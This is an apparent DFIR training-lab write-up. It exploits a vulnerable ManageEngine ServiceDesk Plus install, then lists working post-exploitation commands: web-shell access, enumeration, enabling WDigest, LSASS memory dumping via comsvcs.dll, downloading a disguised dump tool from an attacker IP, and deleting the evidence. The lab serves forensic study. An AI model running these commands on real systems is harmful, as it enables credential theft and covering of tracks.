# Building My First DFIR Lab

## Lab Schema

![](LabSchema.png)


## Environment Setup
- Victim Machine: Windows 10 has:
    -  Vulnerable ManageEngine ServiceDesk Plus build 11303 found on the [ManageEngine Archives](https://archives.manageengine.com/service-desk/11303/)
    -  Sysmon for Windows Logging
    -  Wireshark
- Attacker Machine: Kali Linux
- Server: Windows 10
## Planning
- We will be dividing our lab to multiple parts
    - Part 1: Initial Access & Credentials Dumping
    - 

## Let's Go
- Part 1:
  a. Applying The Exploit:
  ![image](https://github.com/user-attachments/assets/d39fde33-273d-403c-9195-8dac52d64db1)
  
  ![image](https://github.com/user-attachments/assets/e7563550-22d8-4a1b-b8eb-b9b3761d9678)

  b. Visiting wbsh.jsp

  ![image](https://github.com/user-attachments/assets/bb3eb98c-0af0-4dd2-ab0b-e478fed02f31)

  c. Enum
      1. `whoami`
      2. `ipconfig /all`
      3. `systeminfo`
      4. `arp -a`
      5. `tasklist`
          lsass.exe                      652 Services                   0     16,848 K
      6. `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential`
  e. `powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'`
  f. `C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 652 C:\Windows\Temp\logctl.zip full`
  g. Download C:\Windows\Temp\logctl.zip
  h. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file2.exe', 'C:\windows\temp\calc.exe')`
  k. `C:\windows\temp\calc.exe -accepteula -ma 652 C:\Windows\Temp\logct2.dmp`
  l. Delete them
     `Remove-Item -Path "C:\Windows\Temp\logct2.dmp", "C:\Windows\Temp\logctl.zip"`
  
